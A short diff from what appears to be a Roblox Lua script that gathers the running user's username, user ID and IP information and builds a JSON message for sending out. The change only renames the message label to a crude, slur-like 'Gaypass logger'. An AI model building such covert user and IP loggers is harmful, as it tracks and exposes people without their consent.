@@ -55,7 +55,7 @@ local scriptTime = os.date("%H:%M:%S - %d/%m/%Y", os.time())
 local ipInfo = GetIPInfo()
 
 -- Gửi thông báo ngắn gọn
-local messageText = "Caught 1 skid: " .. username .. " (" .. userId .. ")"
+local messageText = "Gaypass logger: " .. username .. " (" .. userId .. ")"
 local headers = { ["Content-Type"] = "application/json" }
 local messageBody = HttpService:JSONEncode({ content = messageText })
 
